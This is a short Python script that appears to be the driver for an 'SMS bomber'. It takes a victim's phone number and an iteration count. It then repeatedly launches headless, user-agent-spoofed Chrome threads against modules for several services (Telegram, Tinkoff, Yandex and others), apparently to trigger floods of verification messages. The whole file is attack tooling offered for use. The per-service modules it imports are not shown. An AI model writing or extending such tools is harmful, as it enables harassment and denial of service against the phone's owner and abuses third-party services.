from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

from useful.bomber.tg.main import tg
from useful.bomber.tinkoff.main import tinkoff
from useful.bomber.yarus.main import yarus
from useful.bomber.globus.main import globus
from useful.bomber.pka.main import pka
from useful.bomber.yandex.main import yandex
from useful.bomber.sunlight.main import sunlight

from webdriver_manager.chrome import ChromeDriverManager as driver_manager

from threading import Thread

from time import sleep


def bomber(phone_number: str | int, iters: str | int):
    funcs_list = [tg, tinkoff, yarus, yandex, globus, pka, sunlight]
    opts = webdriver.ChromeOptions()
    opts.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
    opts.add_argument('--headless')

    for i in range(int(iters)):
        for func in funcs_list:
            Thread(target=func, args=(opts, phone_number,)).start()
            sleep(3)
        sleep(3)
